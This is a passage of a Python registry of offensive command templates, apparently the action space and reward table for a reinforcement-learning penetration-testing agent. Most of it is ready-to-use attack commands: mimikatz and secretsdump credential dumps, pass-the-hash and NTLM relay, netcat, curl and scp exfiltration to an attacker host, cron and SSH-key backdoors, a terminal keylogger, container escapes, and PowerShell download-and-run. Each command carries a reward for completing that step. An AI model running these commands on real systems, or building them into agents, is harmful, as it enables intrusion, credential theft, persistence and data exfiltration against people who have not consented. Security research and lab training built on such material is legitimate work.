    success_indicators=["Linux", "Ubuntu", "CentOS", "Debian"],
    typical_reward=1.0,
    tags={"linux", "kernel"}
))

# --- Windows PrivEsc ---
register(CommandTemplate(
    name="winpeas",
    template=".\\winPEASx64.exe",
    description="WinPEAS - comprehensive Windows privilege escalation checker.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"windows_shell_obtained", "winpeas_uploaded"},
    success_indicators=["[!]", "Vulnerable", "Password"],
    typical_reward=3.0,
    tags={"windows", "privesc"}
))

register(CommandTemplate(
    name="whoami_all",
    template="whoami /all",
    description="Show current user, groups, and privileges.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"windows_shell_obtained"},
    success_indicators=["PRIVILEGES", "GROUP INFORMATION"],
    typical_reward=1.0,
    tags={"windows", "enumeration"}
))

register(CommandTemplate(
    name="systeminfo",
    template="systeminfo",
    description="Get Windows system info. Check for patches.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"windows_shell_obtained"},
    success_indicators=["OS Name:", "Hotfix(s):"],
    typical_reward=1.0,
    tags={"windows", "enumeration"}
))

register(CommandTemplate(
    name="windows_exploit_suggester",
    template="python windows-exploit-suggester.py --database {database} --systeminfo {sysinfo_file}",
    description="Suggest exploits based on systeminfo output.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=["database", "sysinfo_file"],
    preconditions={"systeminfo_obtained"},
    success_indicators=["[E]", "[M]", "CVE-"],
    typical_reward=2.0,
    tags={"windows", "exploits"}
))

register(CommandTemplate(
    name="accesschk_services",
    template="accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula",
    description="Check service permissions for privilege escalation.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"windows_shell_obtained", "accesschk_uploaded"},
    success_indicators=["SERVICE_ALL_ACCESS", "SERVICE_CHANGE_CONFIG"],
    typical_reward=2.5,
    tags={"windows", "services"}
))

register(CommandTemplate(
    name="powerup",
    template="powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('{url}'); Invoke-AllChecks\"",
    description="PowerUp - PowerShell privilege escalation checks.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    optional_params={"url": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"},
    preconditions={"windows_shell_obtained"},
    success_indicators=["AbuseFunction", "ModifiablePath"],
    typical_reward=3.0,
    tags={"windows", "powershell", "privesc"}
))

# =============================================================================
# PHASE 5: LATERAL MOVEMENT
# =============================================================================

# --- BloodHound ---
register(CommandTemplate(
    name="bloodhound_python",
    template="bloodhound-python -c All -u {username} -p {password} -d {domain} -dc {dc} -ns {target}",
    description="Collect AD data for BloodHound. Maps attack paths.",
    phase=AttackPhase.LATERAL_MOVEMENT,
    required_params=["username", "password", "domain", "dc", "target"],
    preconditions={"domain_joined", "credentials_known"},
    success_indicators=["Done", "users", "computers", "groups"],
    typical_reward=5.0,
    tags={"bloodhound", "ad", "mapping"}
))

register(CommandTemplate(
    name="sharphound",
    template=".\\SharpHound.exe -c All",
    description="SharpHound collection from Windows. Generates zip for BloodHound.",
    phase=AttackPhase.LATERAL_MOVEMENT,
    required_params=[],
    preconditions={"windows_shell_obtained", "domain_joined"},
    success_indicators=["Done", ".zip", "Compressing"],
    typical_reward=5.0,
    tags={"bloodhound", "windows", "collection"}
))

# --- Pass-the-Hash ---
register(CommandTemplate(
    name="impacket_pth_psexec",
    template="impacket-psexec {domain}/{username}@{target} -hashes :{hash}",
    description="PsExec with NTLM hash (pass-the-hash).",
    phase=AttackPhase.LATERAL_MOVEMENT,
    required_params=["target", "username", "hash"],
    optional_params={"domain": "."},
    preconditions={"hash_known", "smb_service_found"},
    success_indicators=["Microsoft Windows", "C:\\"],
    typical_reward=8.0,
    tags={"impacket", "pth", "lateral"}
))

register(CommandTemplate(
    name="crackmapexec_pth",
    template="crackmapexec smb {target} -u {username} -H {hash}",
    description="Test hash against multiple targets.",
    phase=AttackPhase.LATERAL_MOVEMENT,
    required_params=["target", "username", "hash"],
    preconditions={"hash_known"},
    success_indicators=["[+]", "Pwn3d!"],
    typical_reward=6.0,
    tags={"cme", "pth", "spray"}
))

# --- SMB Relay ---
register(CommandTemplate(
    name="responder",
    template="responder -I {interface} -dwPv",
    description="LLMNR/NBT-NS poisoner. Captures NetNTLM hashes.",
    phase=AttackPhase.LATERAL_MOVEMENT,
    required_params=["interface"],
    preconditions={"network_access"},
    success_indicators=["NTLMv2", "Hash", "[+]"],
    typical_reward=5.0,
    tags={"responder", "mitm", "hashes"}
))

register(CommandTemplate(
    name="ntlmrelayx",
    template="impacket-ntlmrelayx -tf {targets} -smb2support -i",
    description="NTLM relay attack. Relay captured hashes to other hosts.",
    phase=AttackPhase.LATERAL_MOVEMENT,
    required_params=["targets"],
    preconditions={"smb_signing_disabled"},
    success_indicators=["Servers started", "HTTPD", "SMBD"],
    typical_reward=7.0,
    tags={"impacket", "relay", "mitm"}
))

# --- Tunneling ---
register(CommandTemplate(
    name="chisel_server",
    template="chisel server -p {port} --reverse",
    description="Start Chisel server for reverse tunneling.",
    phase=AttackPhase.LATERAL_MOVEMENT,
    required_params=["port"],
    preconditions=set(),
    success_indicators=["server:", "Listening"],
    typical_reward=2.0,
    tags={"tunneling", "chisel"}
))

register(CommandTemplate(
    name="chisel_client",
    template="./chisel client {server}:{port} R:{local_port}:{target}:{remote_port}",
    description="Connect Chisel client to create reverse tunnel.",
    phase=AttackPhase.LATERAL_MOVEMENT,
    required_params=["server", "port", "local_port", "target", "remote_port"],
    preconditions={"shell_obtained"},
    success_indicators=["Connected", "Fingerprint"],
    typical_reward=3.0,
    tags={"tunneling", "chisel"}
))

register(CommandTemplate(
    name="ligolo_agent",
    template="./agent -connect {server}:11601 -ignore-cert",
    description="Ligolo-ng agent for tunneling through compromised host.",
    phase=AttackPhase.LATERAL_MOVEMENT,
    required_params=["server"],
    preconditions={"shell_obtained"},
    success_indicators=["Agent", "connected"],
    typical_reward=3.0,
    tags={"tunneling", "ligolo"}
))

register(CommandTemplate(
    name="ssh_tunnel_local",
    template="ssh -L {local_port}:{target}:{remote_port} {username}@{pivot}",
    description="SSH local port forward through pivot host.",
    phase=AttackPhase.LATERAL_MOVEMENT,
    required_params=["local_port", "target", "remote_port", "username", "pivot"],
    preconditions={"ssh_access"},
    success_indicators=["bind", "forwarding"],
    typical_reward=3.0,
    tags={"ssh", "tunneling", "pivot"}
))

register(CommandTemplate(
    name="ssh_tunnel_dynamic",
    template="ssh -D {port} {username}@{pivot}",
    description="SSH SOCKS proxy for dynamic port forwarding.",
    phase=AttackPhase.LATERAL_MOVEMENT,
    required_params=["port", "username", "pivot"],
    preconditions={"ssh_access"},
    success_indicators=["bind"],
    typical_reward=3.0,
    tags={"ssh", "socks", "proxy"}
))

# =============================================================================
# PHASE 6: POST-EXPLOITATION
# =============================================================================

# --- Credential Dumping ---
register(CommandTemplate(
    name="impacket_secretsdump",
    template="impacket-secretsdump {domain}/{username}:{password}@{target}",
    description="Dump SAM/NTDS hashes. Get all domain credentials.",
    phase=AttackPhase.POST_EXPLOITATION,
    required_params=["target", "username", "password"],
    optional_params={"domain": "."},
    preconditions={"admin_access_obtained"},
    success_indicators=["Administrator:", ":500:", ":::"],
    typical_reward=10.0,
    tags={"impacket", "dump", "hashes"}
))

register(CommandTemplate(
    name="secretsdump_dc",
    template="impacket-secretsdump -just-dc {domain}/{username}:{password}@{target}",
    description="Dump NTDS.dit from domain controller. All domain hashes.",
    phase=AttackPhase.POST_EXPLOITATION,
    required_params=["target", "domain", "username", "password"],
    preconditions={"domain_admin_obtained"},
    success_indicators=["Dumping Domain Credentials", ":::"],
    typical_reward=15.0,
    tags={"impacket", "ntds", "dc"}
))

register(CommandTemplate(
    name="mimikatz_logonpasswords",
    template="mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
    description="Dump passwords from memory. Need admin.",
    phase=AttackPhase.POST_EXPLOITATION,
    required_params=[],
    preconditions={"windows_admin_obtained", "mimikatz_uploaded"},
    success_indicators=["Username :", "Password :", "NTLM"],
    typical_reward=10.0,
    tags={"mimikatz", "dump", "memory"}
))

register(CommandTemplate(
    name="mimikatz_sam",
    template="mimikatz.exe \"privilege::debug\" \"lsadump::sam\" \"exit\"",
    description="Dump SAM database for local hashes.",
    phase=AttackPhase.POST_EXPLOITATION,
    required_params=[],
    preconditions={"windows_admin_obtained"},
    success_indicators=["RID  :", "Hash NTLM:"],
    typical_reward=8.0,
    tags={"mimikatz", "sam", "local"}
))

register(CommandTemplate(
    name="mimikatz_dcsync",
    template="mimikatz.exe \"lsadump::dcsync /domain:{domain} /user:{username}\" \"exit\"",
    description="DCSync - replicate credentials from DC. Need replication rights.",
    phase=AttackPhase.POST_EXPLOITATION,
    required_params=["domain", "username"],
    preconditions={"dcsync_rights"},
    success_indicators=["Hash NTLM:", "Credentials:"],
    typical_reward=12.0,
    tags={"mimikatz", "dcsync", "ad"}
))

# --- File Exfiltration ---
register(CommandTemplate(
    name="nc_exfil",
    template="nc {attacker} {port} < {file}",
    description="Exfiltrate file via netcat.",
    phase=AttackPhase.EXFILTRATION,
    required_params=["attacker", "port", "file"],
    preconditions={"shell_obtained", "nc_available"},
    success_indicators=[""],
    typical_reward=2.0,
    tags={"exfil", "netcat"}
))

register(CommandTemplate(
    name="curl_exfil",
    template="curl -X POST -d @{file} http://{attacker}:{port}/",
    description="Exfiltrate file via HTTP POST.",
    phase=AttackPhase.EXFILTRATION,
    required_params=["file", "attacker", "port"],
    preconditions={"shell_obtained"},
    success_indicators=[""],
    typical_reward=2.0,
    tags={"exfil", "http"}
))

register(CommandTemplate(
    name="scp_exfil",
    template="scp {file} {username}@{attacker}:{remote_path}",
    description="Exfiltrate via SCP.",
    phase=AttackPhase.EXFILTRATION,
    required_params=["file", "username", "attacker", "remote_path"],
    preconditions={"shell_obtained", "outbound_ssh"},
    success_indicators=["100%"],
    typical_reward=2.0,
    tags={"exfil", "scp"}
))

# --- Persistence ---
register(CommandTemplate(
    name="cron_backdoor",
    template="echo '* * * * * {command}' >> /var/spool/cron/crontabs/{user}",
    description="Add cron job for persistence.",
    phase=AttackPhase.POST_EXPLOITATION,
    required_params=["command", "user"],
    preconditions={"linux_root_obtained"},
    success_indicators=[""],
    typical_reward=5.0,
    tags={"persistence", "cron", "linux"}
))

register(CommandTemplate(
    name="ssh_key_persistence",
    template="echo '{public_key}' >> /home/{user}/.ssh/authorized_keys",
    description="Add SSH key for persistent access.",
    phase=AttackPhase.POST_EXPLOITATION,
    required_params=["public_key", "user"],
    preconditions={"linux_shell_obtained"},
    success_indicators=[""],
    typical_reward=5.0,
    tags={"persistence", "ssh", "linux"}
))


# =============================================================================
# ADDITIONAL ADVANCED TECHNIQUES
# =============================================================================

# --- CrackMapExec Advanced ---
register(CommandTemplate(
    name="cme_ldap_users",
    template="crackmapexec ldap {target} -u {username} -p {password} --users",
    description="Enumerate domain users via LDAP with CrackMapExec.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target", "username", "password"],
    preconditions={"ldap_service_found", "credentials_known"},
    success_indicators=["[+]", "Users"],
    typical_reward=3.0,
    tags={"cme", "ldap", "users", "ad"}
))

register(CommandTemplate(
    name="cme_smb_shares",
    template="crackmapexec smb {target} -u {username} -p {password} --shares",
    description="Enumerate SMB shares with credentials.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target", "username", "password"],
    preconditions={"smb_service_found", "credentials_known"},
    success_indicators=["READ", "WRITE", "[+]"],
    typical_reward=2.5,
    tags={"cme", "smb", "shares"}
))

register(CommandTemplate(
    name="cme_exec_command",
    template="crackmapexec smb {target} -u {username} -p {password} -x '{command}'",
    description="Execute command via SMB with admin credentials.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "username", "password", "command"],
    preconditions={"smb_service_found", "admin_credentials_known"},
    success_indicators=["[+]", "Pwn3d!"],
    typical_reward=8.0,
    tags={"cme", "smb", "exec"}
))

# --- Metasploit Integration ---
register(CommandTemplate(
    name="msfconsole_exploit",
    template="msfconsole -q -x 'use {module}; set RHOSTS {target}; set LHOST {lhost}; exploit'",
    description="Run Metasploit exploit module.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["module", "target", "lhost"],
    preconditions={"vulnerability_found"},
    success_indicators=["session", "opened", "Meterpreter"],
    typical_reward=10.0,
    tags={"metasploit", "exploit"}
))

register(CommandTemplate(
    name="msfvenom_payload",
    template="msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format} -o {output}",
    description="Generate Metasploit payload.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["payload", "lhost", "lport", "format", "output"],
    optional_params={"format": "exe", "payload": "windows/x64/meterpreter/reverse_tcp"},
    preconditions=set(),
    success_indicators=["Saved as"],
    typical_reward=3.0,
    tags={"metasploit", "payload"}
))

# --- Advanced Impacket ---
register(CommandTemplate(
    name="impacket_atexec",
    template="impacket-atexec {domain}/{username}:{password}@{target} '{command}'",
    description="Execute command via Windows Task Scheduler.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "username", "password", "command"],
    optional_params={"domain": "."},
    preconditions={"smb_service_found", "admin_credentials_known"},
    success_indicators=["output"],
    typical_reward=7.0,
    tags={"impacket", "exec", "scheduled_task"}
))

register(CommandTemplate(
    name="impacket_dcomexec",
    template="impacket-dcomexec {domain}/{username}:{password}@{target} '{command}'",
    description="Execute command via DCOM. Stealthier alternative.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "username", "password", "command"],
    optional_params={"domain": "."},
    preconditions={"smb_service_found", "admin_credentials_known"},
    success_indicators=["output"],
    typical_reward=7.5,
    tags={"impacket", "dcom", "exec"}
))

register(CommandTemplate(
    name="impacket_reg",
    template="impacket-reg {domain}/{username}:{password}@{target} query -keyName '{key}'",
    description="Query Windows registry remotely.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target", "username", "password", "key"],
    optional_params={"domain": "."},
    preconditions={"smb_service_found", "credentials_known"},
    success_indicators=["REG_"],
    typical_reward=2.0,
    tags={"impacket", "registry", "enumeration"}
))

# --- Web Exploitation Advanced ---
register(CommandTemplate(
    name="wpscan",
    template="wpscan --url {url} --enumerate {enumerate} --api-token {token}",
    description="WordPress vulnerability scanner. Finds plugins, themes, users.",
    phase=AttackPhase.ENUMERATION,
    required_params=["url"],
    optional_params={"enumerate": "vp,vt,u", "token": ""},
    preconditions={"http_service_found", "wordpress_found"},
    success_indicators=["Vulnerability", "[!]", "WordPress"],
    typical_reward=3.0,
    tags={"web", "wordpress", "scanner"}
))

register(CommandTemplate(
    name="nuclei_scan",
    template="nuclei -u {url} -t {templates} -severity {severity}",
    description="Fast vulnerability scanner with templates.",
    phase=AttackPhase.ENUMERATION,
    required_params=["url"],
    optional_params={"templates": "cves/", "severity": "medium,high,critical"},
    preconditions={"http_service_found"},
    success_indicators=["[", "CVE-", "found"],
    typical_reward=3.5,
    tags={"web", "scanner", "nuclei"}
))

register(CommandTemplate(
    name="dirsearch",
    template="dirsearch -u {url} -e {extensions} -t {threads}",
    description="Advanced web path scanner. Alternative to gobuster.",
    phase=AttackPhase.ENUMERATION,
    required_params=["url"],
    optional_params={"extensions": "php,html,txt,bak,old", "threads": "50"},
    preconditions={"http_service_found"},
    success_indicators=["200", "301", "302"],
    typical_reward=2.0,
    tags={"web", "directories", "bruteforce"}
))

# --- Credential Discovery (ENUMERATION → EXPLOITATION bridge) ---
# These tools discover credentials, enabling phase transition to EXPLOITATION
register(CommandTemplate(
    name="hydra_ssh",
    template="hydra -l {username} -P {wordlist} ssh://{target} -t {threads}",
    description="Brute-force SSH credentials with Hydra.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target"],
    optional_params={"username": "admin", "wordlist": "/usr/share/wordlists/rockyou.txt", "threads": "4"},
    preconditions={"ssh_service_found"},
    success_indicators=["login:", "password:"],
    typical_reward=8.0,
    tags={"bruteforce", "ssh", "credentials"}
))

register(CommandTemplate(
    name="hydra_ftp",
    template="hydra -l {username} -P {wordlist} ftp://{target}",
    description="Brute-force FTP credentials with Hydra.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target"],
    optional_params={"username": "anonymous", "wordlist": "/usr/share/wordlists/rockyou.txt"},
    preconditions={"ftp_service_found"},
    success_indicators=["login:", "password:"],
    typical_reward=7.0,
    tags={"bruteforce", "ftp", "credentials"}
))

register(CommandTemplate(
    name="hydra_http_form",
    template="hydra -l {username} -P {wordlist} {target} http-post-form '{form}'",
    description="Brute-force HTTP login form.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target", "form"],
    optional_params={"username": "admin", "wordlist": "/usr/share/wordlists/rockyou.txt"},
    preconditions={"http_service_found"},
    success_indicators=["login:", "password:"],
    typical_reward=8.0,
    tags={"bruteforce", "http", "credentials", "web"}
))

register(CommandTemplate(
    name="cme_smb_bruteforce",
    template="crackmapexec smb {target} -u {username} -p {wordlist}",
    description="Brute-force SMB credentials via CrackMapExec.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target"],
    optional_params={"username": "admin", "wordlist": "/usr/share/wordlists/rockyou.txt"},
    preconditions={"smb_service_found"},
    success_indicators=["[+]", "Pwn3d!"],
    typical_reward=9.0,
    tags={"cme", "smb", "bruteforce", "credentials"}
))

register(CommandTemplate(
    name="sqlmap_test",
    template="sqlmap -u '{url}' --batch --dbs",
    description="Test for SQL injection and enumerate databases.",
    phase=AttackPhase.ENUMERATION,
    required_params=["url"],
    preconditions={"http_service_found"},
    success_indicators=["injectable", "DBMS", "available databases"],
    typical_reward=9.0,
    tags={"sqli", "database", "web", "credentials"}
))

register(CommandTemplate(
    name="searchsploit",
    template="searchsploit {query}",
    description="Search for known exploits in Exploit-DB.",
    phase=AttackPhase.ENUMERATION,
    required_params=["query"],
    preconditions=set(),
    success_indicators=["Exploit", "exploit/", "remote", "local"],
    typical_reward=3.0,
    tags={"exploit", "search", "recon"}
))

# --- Exploitation commands (lower preconditions for simulated training) ---
register(CommandTemplate(
    name="msfconsole_auto",
    template="msfconsole -q -x 'search {query}; use 0; set RHOSTS {target}; exploit'",
    description="Search and exploit with Metasploit in one command.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "query"],
    preconditions={"services_enumerated"},
    success_indicators=["session", "opened", "Meterpreter"],
    typical_reward=10.0,
    tags={"metasploit", "exploit", "auto"}
))

register(CommandTemplate(
    name="sudo_check",
    template="sudo -l",
    description="Check sudo privileges for privilege escalation.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"shell_obtained"},
    success_indicators=["(ALL)", "NOPASSWD", "may run"],
    typical_reward=6.0,
    tags={"privesc", "sudo", "linux"}
))

register(CommandTemplate(
    name="linpeas",
    template="curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
    description="Run LinPEAS for automated Linux privilege escalation enumeration.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"shell_obtained"},
    success_indicators=["CVE", "Vulnerable", "SUID", "writable"],
    typical_reward=5.0,
    tags={"privesc", "linux", "enum"}
))

# --- Database Attacks ---
register(CommandTemplate(
    name="mysql_login",
    template="mysql -h {target} -u {username} -p{password} -e 'SHOW DATABASES;'",
    description="Connect to MySQL and list databases.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "username", "password"],
    preconditions={"mysql_service_found", "credentials_known"},
    success_indicators=["Database", "information_schema"],
    typical_reward=5.0,
    tags={"database", "mysql"}
))

register(CommandTemplate(
    name="mssql_login",
    template="impacket-mssqlclient {domain}/{username}:{password}@{target}",
    description="Connect to MSSQL server.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target", "username", "password"],
    optional_params={"domain": "."},
    preconditions={"mssql_service_found", "credentials_known"},
    success_indicators=["SQL>"],
    typical_reward=5.0,
    tags={"database", "mssql", "impacket"}
))

register(CommandTemplate(
    name="redis_cli",
    template="redis-cli -h {target} INFO",
    description="Connect to Redis and get server info.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target"],
    preconditions={"redis_service_found"},
    success_indicators=["redis_version", "connected_clients"],
    typical_reward=2.0,
    tags={"database", "redis"}
))

# --- Active Directory Attacks ---
register(CommandTemplate(
    name="certipy_find",
    template="certipy find -u {username}@{domain} -p {password} -dc-ip {target}",
    description="Find vulnerable AD certificate templates (ESC1-ESC8).",
    phase=AttackPhase.ENUMERATION,
    required_params=["username", "password", "domain", "target"],
    preconditions={"domain_joined", "credentials_known"},
    success_indicators=["Vulnerable", "ESC"],
    typical_reward=4.0,
    tags={"ad", "certificates", "certipy"}
))

register(CommandTemplate(
    name="certipy_req",
    template="certipy req -u {username}@{domain} -p {password} -ca {ca} -template {template} -dc-ip {target}",
    description="Request certificate for privilege escalation.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=["username", "password", "domain", "ca", "template", "target"],
    preconditions={"vulnerable_template_found"},
    success_indicators=["pfx", "Saved"],
    typical_reward=8.0,
    tags={"ad", "certificates", "privesc"}
))

register(CommandTemplate(
    name="rubeus_asreproast",
    template=".\\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt",
    description="AS-REP Roasting from Windows. Get hashes for cracking.",
    phase=AttackPhase.EXPLOITATION,
    required_params=[],
    preconditions={"windows_shell_obtained", "domain_joined"},
    success_indicators=["$krb5asrep$", "hashes"],
    typical_reward=5.0,
    tags={"ad", "kerberos", "rubeus"}
))

register(CommandTemplate(
    name="rubeus_kerberoast",
    template=".\\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt",
    description="Kerberoasting from Windows. Get TGS hashes.",
    phase=AttackPhase.EXPLOITATION,
    required_params=[],
    preconditions={"windows_shell_obtained", "domain_joined"},
    success_indicators=["$krb5tgs$", "hashes"],
    typical_reward=5.0,
    tags={"ad", "kerberos", "rubeus"}
))


# =============================================================================
# PHASE 3: EXPANDED COMMANDS — PRIVESC / LATERAL / POST / EXFIL
# =============================================================================

# --- Linux Privilege Escalation (expanded) ---
register(CommandTemplate(
    name="find_suid",
    template="find / -perm -4000 -type f 2>/dev/null",
    description="Find SUID binaries that may allow privilege escalation.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"shell_obtained"},
    success_indicators=["/usr/bin/", "/usr/sbin/", "nmap", "vim", "find", "bash"],
    typical_reward=5.0,
    tags={"privesc", "suid", "linux"}
))

register(CommandTemplate(
    name="find_sgid",
    template="find / -perm -2000 -type f 2>/dev/null",
    description="Find SGID binaries for potential group-based privesc.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"shell_obtained"},
    success_indicators=["/usr/bin/", "wall", "ssh-agent"],
    typical_reward=3.0,
    tags={"privesc", "sgid", "linux"}
))

register(CommandTemplate(
    name="kernel_exploit_check",
    template="uname -a && cat /etc/os-release",
    description="Check kernel version and OS for known exploits (DirtyCow, etc).",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"shell_obtained"},
    success_indicators=["Linux", "Ubuntu", "CentOS", "Debian"],
    typical_reward=4.0,
    tags={"privesc", "kernel", "linux"}
))

register(CommandTemplate(
    name="cron_check",
    template="cat /etc/crontab && ls -la /etc/cron.* 2>/dev/null && crontab -l 2>/dev/null",
    description="Check cron jobs for writable scripts or misconfigurations.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"shell_obtained"},
    success_indicators=["root", "* * *", ".sh", "python"],
    typical_reward=4.0,
    tags={"privesc", "cron", "linux"}
))

register(CommandTemplate(
    name="writable_etc_passwd",
    template="ls -la /etc/passwd && test -w /etc/passwd && echo 'WRITABLE'",
    description="Check if /etc/passwd is writable for adding root user.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"shell_obtained"},
    success_indicators=["WRITABLE"],
    typical_reward=6.0,
    tags={"privesc", "passwd", "linux"}
))

register(CommandTemplate(
    name="capability_check",
    template="getcap -r / 2>/dev/null",
    description="Find binaries with Linux capabilities for privesc.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"shell_obtained"},
    success_indicators=["cap_setuid", "cap_setgid", "cap_sys_admin"],
    typical_reward=5.0,
    tags={"privesc", "capabilities", "linux"}
))

register(CommandTemplate(
    name="docker_privesc",
    template="docker run -v /:/host --rm -it alpine chroot /host sh",
    description="Escape to host via Docker socket if user is in docker group.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"shell_obtained", "docker_group"},
    success_indicators=["#", "root"],
    typical_reward=8.0,
    tags={"privesc", "docker", "container"}
))

register(CommandTemplate(
    name="lxd_privesc",
    template="lxc init ubuntu:18.04 privesc -c security.privileged=true && lxc config device add privesc host-root disk source=/ path=/mnt/root && lxc start privesc && lxc exec privesc -- /bin/sh",
    description="LXD/LXC container escape for root access.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"shell_obtained", "lxd_group"},
    success_indicators=["root"],
    typical_reward=8.0,
    tags={"privesc", "lxd", "container"}
))

register(CommandTemplate(
    name="pspy_monitor",
    template="./pspy64 -p -i 1000",
    description="Monitor processes without root. Find scheduled tasks and cron activity.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"shell_obtained"},
    success_indicators=["CMD:", "UID=0", "cron"],
    typical_reward=4.0,
    tags={"privesc", "process", "monitoring"}
))

# --- Lateral Movement (expanded) ---
register(CommandTemplate(
    name="pivot_scan",
    template="for i in $(seq 1 254); do ping -c 1 -W 1 {subnet}.$i 2>/dev/null | grep 'bytes from' & done; wait",
    description="Ping sweep internal subnet from compromised host.",
    phase=AttackPhase.LATERAL_MOVEMENT,
    required_params=["subnet"],
    optional_params={"subnet": "10.10.10"},
    preconditions={"shell_obtained"},
    success_indicators=["bytes from", "64 bytes"],
    typical_reward=5.0,
    tags={"lateral", "pivot", "network"}
))

register(CommandTemplate(
    name="nmap_pivot",
    template="nmap -sS -Pn --top-ports 20 {target}",
    description="Port scan internal target through pivot host.",
    phase=AttackPhase.LATERAL_MOVEMENT,
    required_params=["target"],
    preconditions={"shell_obtained"},
    success_indicators=["open", "filtered"],
    typical_reward=4.0,
    tags={"lateral", "nmap", "pivot"}
))

register(CommandTemplate(
    name="proxychains_scan",
    template="proxychains nmap -sT -Pn {target} --top-ports 100",
    description="Scan internal network through SOCKS proxy.",
    phase=AttackPhase.LATERAL_MOVEMENT,
    required_params=["target"],
    preconditions={"socks_proxy_set"},
    success_indicators=["open", "filtered"],
    typical_reward=4.0,
    tags={"lateral", "proxychains", "pivot"}
))

register(CommandTemplate(
    name="winrm_exec",
    template="evil-winrm -i {target} -u {username} -p {password}",
    description="Get interactive PowerShell via WinRM.",
    phase=AttackPhase.LATERAL_MOVEMENT,
    required_params=["target", "username", "password"],
    preconditions={"winrm_service_found", "credentials_known"},
    success_indicators=["Evil-WinRM", "PS >"],
    typical_reward=7.0,
    tags={"lateral", "winrm", "powershell"}
))

register(CommandTemplate(
    name="ssh_lateral",
    template="ssh {username}@{target}",
    description="SSH to internal host using harvested credentials.",
    phase=AttackPhase.LATERAL_MOVEMENT,
    required_params=["target", "username"],
    preconditions={"credentials_known", "ssh_service_found"},
    success_indicators=["$", "#", "Last login"],
    typical_reward=6.0,
    tags={"lateral", "ssh"}
))

# --- Post-Exploitation (expanded) ---
register(CommandTemplate(
    name="credential_dump",
    template="cat /etc/shadow 2>/dev/null || hashdump",
    description="Dump system credential hashes for offline cracking.",
    phase=AttackPhase.POST_EXPLOITATION,
    required_params=[],
    preconditions={"root_shell_obtained"},
    success_indicators=["root:", "$6$", "$y$", "::"],
    typical_reward=10.0,
    tags={"post", "credentials", "dump"}
))

register(CommandTemplate(
    name="hashdump",
    template="cat /etc/shadow | grep -v '!' | grep -v '*'",
    description="Extract password hashes from shadow file.",
    phase=AttackPhase.POST_EXPLOITATION,
    required_params=[],
    preconditions={"root_shell_obtained"},
    success_indicators=["$6$", "$5$", "$1$", "root:"],
    typical_reward=8.0,
    tags={"post", "hashes", "linux"}
))

register(CommandTemplate(
    name="keylogger_deploy",
    template="nohup script -q /tmp/.keylog &",
    description="Deploy basic keylogger to capture terminal input.",
    phase=AttackPhase.POST_EXPLOITATION,
    required_params=[],
    preconditions={"shell_obtained"},
    success_indicators=["nohup", "started"],
    typical_reward=4.0,
    tags={"post", "keylogger", "persistence"}
))

register(CommandTemplate(
    name="history_dump",
    template="cat ~/.bash_history ~/.zsh_history /root/.bash_history 2>/dev/null",
    description="Dump command history for credentials and patterns.",
    phase=AttackPhase.POST_EXPLOITATION,
    required_params=[],
    preconditions={"shell_obtained"},
    success_indicators=["ssh", "mysql", "password", "wget"],
    typical_reward=5.0,
    tags={"post", "history", "recon"}
))

register(CommandTemplate(
    name="network_config_dump",
    template="ifconfig 2>/dev/null || ip addr && ip route && cat /etc/resolv.conf",
    description="Dump network configuration for internal network mapping.",
    phase=AttackPhase.POST_EXPLOITATION,
    required_params=[],
    preconditions={"shell_obtained"},
    success_indicators=["inet", "eth0", "default via"],
    typical_reward=4.0,
    tags={"post", "network", "recon"}
))

register(CommandTemplate(
    name="ssh_key_harvest",
    template="find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null",
    description="Find SSH private keys for lateral movement.",
    phase=AttackPhase.POST_EXPLOITATION,
    required_params=[],
    preconditions={"shell_obtained"},
    success_indicators=["id_rsa", "id_ed25519", ".pem"],
    typical_reward=7.0,
    tags={"post", "ssh_keys", "lateral"}
))

register(CommandTemplate(
